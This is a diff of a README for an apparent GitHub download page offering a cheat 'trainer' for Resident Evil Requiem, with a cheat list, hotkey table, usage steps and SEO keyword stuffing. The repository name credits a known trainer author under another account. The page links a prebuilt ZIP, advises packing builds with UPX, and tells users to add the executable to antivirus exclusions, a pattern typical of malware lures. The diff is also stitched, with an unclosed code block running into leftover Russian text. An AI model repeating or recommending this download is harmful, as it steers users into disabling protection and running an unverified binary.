@@ -1,63 +1,104 @@
 <div align="center">
-  <h1>Resident Evil Requiem Trainer <sub>v1.0.7</sub></h1>
+  <h1>Resident Evil Requiem Trainer v1.0.7 – RE9 Trainer 2026</h1>
   
-  <h3>Профессиональный трейнер для <b>Resident Evil Requiem (RE9)</b><br>с 15+ функциями и стильным ImGui-оверлеем</h3>
+  <h2>Resident Evil Requiem Trainer | RE9 Cheats | Infinite Health, Infinite Ammo, God Mode, No Reload</h2>
 
   <p>
-    <img src="https://img.shields.io/badge/Platform-Windows%20x64-0078D7?style=for-the-badge&logo=windows&logoColor=white" alt="Windows x64">
-    <img src="https://img.shields.io/badge/ImGui-DX11-9FE870?style=for-the-badge" alt="ImGui + DX11">
-    <img src="https://img.shields.io/badge/Status-Offline%20Only-ff4444?style=for-the-badge" alt="Offline Only">
+    <strong>Download Resident Evil Requiem Trainer</strong> – the best free RE9 trainer for PC (Steam) with 15+ cheats.
+    Works on game version v1.7 (March 2026 patch) – Steam AppID 3764200.
+  </p>
+
+  <p>
+    <img src="https://img.shields.io/badge/Offline%20Only-critical?style=for-the-badge&logo=warning&logoColor=white&color=red" alt="Offline Only">
+    <img src="https://img.shields.io/badge/Windows%20x64-0078D7?style=for-the-badge&logo=windows" alt="Windows x64">
+    <img src="https://img.shields.io/badge/RE9%20Trainer-v1.0.7-success?style=for-the-badge" alt="Latest Version">
   </p>
 
   <br>
 
-  <p><strong>⚠️ Только одиночная игра / оффлайн-режим!</strong><br>
-  Использование в RE.Net, Mercenaries или любых онлайн-элементах → практически гарантированный бан.</p>
-
-  <p><strong>Поддерживаемая версия игры:</strong> v1.7 (Steam AppID 3764200) • март 2026 патч</p>
-
-  <br>
-
   <a href="https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip">
-    <img src="https://img.shields.io/badge/СКАЧАТЬ%20v1.0.7-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=006400" alt="Скачать v1.0.7">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20Resident%20Evil%20Requiem%20Trainer%20v1.0.7-00C853?style=for-the-badge&logo=windows&logoColor=white" alt="Download RE9 Trainer v1.0.7">
   </a>
 
   <br><br>
 
-  <img src="https://github.com/user-attachments/assets/61b3da88-6f92-43fb-8840-942a7eb6df91" width="520" alt="Главное окно трейнера">
+  <img src="https://github.com/user-attachments/assets/61b3da88-6f92-43fb-8840-942a7eb6df91" width="520" alt="Resident Evil Requiem Trainer waiting for process">
   <br><br>
-  <img src="https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528" width="520" alt="Трейнер в действии">
+  <img src="https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528" width="520" alt="RE9 Trainer full cheat list God Mode Infinite Ammo">
 
 </div>
 
 ---
 
-## Функции трейнера
+## Resident Evil Requiem Trainer Features – RE9 Cheats 2026
 
-- God Mode / Полная неуязвимость  
-- Infinite Health  
-- Infinite Ammo + No Reload  
-- Infinite Items / Grenades / Throwables  
+- God Mode / Ignore Hits  
+- Infinite Health (Unlimited HP)  
+- Infinite Ammo – No Reload  
+- Infinite Items & Grenades  
 - Infinite Knife Durability  
 - One Hit Kill  
-- Freeze Enemies  
-- Super Speed / Super Jump  
+- Freeze Enemies / AI  
+- Super Speed & Super Jump  
 - No Recoil / No Spread  
-- Game Speed (ускорение/замедление игры)  
-- Infinite Money / Upgrade Points (CP Editor)  
+- Game Speed Hack  
+- Infinite Money / CP Editor (Upgrade Points)  
 - Unlock All Special Content  
 - Reset Save Count  
-- Динамический статус подключения (PID, CPU/Memory usage)  
-- Авто-определение процесса игры каждую секунду  
+- Auto-attach to ResidentEvilRequiem.exe  
+- Real-time PID & status display  
 
-## Горячие клавиши
+**Important:** This trainer works **offline/single-player only**. Online use (RE.Net, Mercenaries) = high ban risk.
 
-| Клавиша     | Функция                              |
+## RE9 Trainer Hotkeys
+
+| Hotkey      | Cheat / Function                     |
 |-------------|--------------------------------------|
-| Num *       | Вкл / Выкл все читы разом            |
-| Num 1 – Num 9 | Активация читов 1–9                |
-| F1 – F6     | Активация читов 10–15                |
-| ESC         | Закрыть окно трейнера                |
+| Num *       | Toggle ALL Cheats (Master Switch)    |
+| Num 1       | God Mode / Ignore Hits               |
+| Num 2       | Infinite Health                      |
+| Num 3       | Infinite Ammo                        |
+| Num 4       | No Reload                            |
+| Num 5       | Infinite Items                       |
+| Num 6       | Infinite Grenades / Throwables       |
+| Num 7       | Infinite Knife Durability            |
+| Num 8       | One Hit Kill                         |
+| Num 9       | Freeze Enemies                       |
+| F1          | Super Speed                          |
+| F2          | Super Jump                           |
+| F3          | No Recoil                            |
+| F4          | No Spread                            |
+| F5          | Game Speed                           |
+| F6          | Infinite Money / CP                  |
+| ESC         | Close Trainer Window                 |
+
+## How to Use Resident Evil Requiem Trainer (RE9 Cheats PC)
+
+1. Launch Resident Evil Requiem (ResidentEvilRequiem.exe)  
+2. Run RERequiem_Trainer_v1.0.7.exe  
+3. Wait for auto-attach (shows "Attached PID: XXXX")  
+4. Press hotkeys to activate cheats  
+5. Enjoy unlimited health, ammo, CP and more  
+
+**Antivirus note:** False positive is common – add to exclusions.
+
+## Supported Game Version
+
+- Resident Evil Requiem v1.7 (launch day patch + March 2026 updates)  
+- Steam PC version (AppID 3764200)  
+- RE Engine game  
+
+## Build RE9 Trainer from Source
+
+Requirements:
+- Visual Studio 2019/2022 x64  
+- Windows SDK 10.0+  
+- Dear ImGui (latest)
+
+After build → compress with UPX:
+```bash
+strip trainer.exe
+upx --best --lzma trainer.exe
 
 ## Как пользоваться
 
@@ -433,6 +474,7 @@ re9 trainer v1.0 steam
 resident evil requiem fearless revolution  
 
 resident-evil-requiem, resident-evil-requiem-cheats, re9-trainer, requiem-fling, fling-trainer-requiem, god-mode-re9, infinite-health-re9, infinite-ammo-re9, no-recoil-re9, rapid-fire-re9, super-accuracy-requiem, infinite-grenades-re9, weapon-durability-re9, highlight-interactables-requiem, super-damage-re9, one-hit-kill-re9, unlock-extras-requiem, edit-cp-re9, pc-cheats-requiem, survival-horror-trainer
+
 
 
 
